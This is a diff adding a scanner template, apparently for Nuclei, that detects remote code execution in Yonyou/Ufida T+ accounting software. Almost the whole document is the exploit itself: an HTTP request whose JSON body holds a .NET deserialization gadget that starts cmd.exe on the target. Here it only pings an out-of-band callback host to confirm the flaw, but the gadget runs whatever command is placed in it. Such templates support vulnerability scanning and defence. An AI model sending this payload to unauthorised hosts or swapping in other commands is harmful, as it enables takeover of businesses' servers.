@@ -1,0 +1,36 @@
+id: cjt-rce
+
+info:
+  name: cjt-rce
+  author: OidBoy
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+
+        {
+          "storeID": {
+            "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName": "Start",
+            "ObjectInstance": {
+              "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "StartInfo": {
+                "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "FileName": "cmd",
+                "Arguments": "/c ping {{interactsh-url}}"
+              }
+            }
+          }
+        }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
